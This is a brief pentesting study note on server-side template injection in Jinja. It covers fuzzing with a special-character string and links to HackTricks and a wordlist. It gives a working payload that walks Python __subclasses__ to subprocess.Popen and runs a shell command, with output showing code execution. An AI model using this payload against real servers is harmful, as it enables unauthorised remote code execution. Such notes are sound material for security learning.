---
tags:
  - Enumeration
  - TCP
  - HTTP
  - Concepts
  - Vulnerabilities
---
Server-side template injection is a vulnerability that occurs when an attacker can inject malicious code into a template that is executed on the server. This vulnerability can be found in various technologies, including Jinja.

To detect Server-Side Template Injection (SSTI), initially, **fuzzing the template** is a straightforward approach. This involves injecting a sequence of special characters (`${{<%[%'"}}%\`) into the template and analysing the differences in the server's response to regular data versus this special payload. Vulnerability indicators include:
# Guide

1. [SSTI (Server Side Template Injection) | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
2. Can access `subprocess.Popen` and use it to Remote Code Execution
```
python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("id", shell=True, stdout=-1).communicate()[0].decode()}}' | grep '<p>' <p>uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

## Wordlist

[SSTI/Wordlist at master · err0rr/SSTI · GitHub](https://github.com/err0rr/SSTI/blob/master/Wordlist)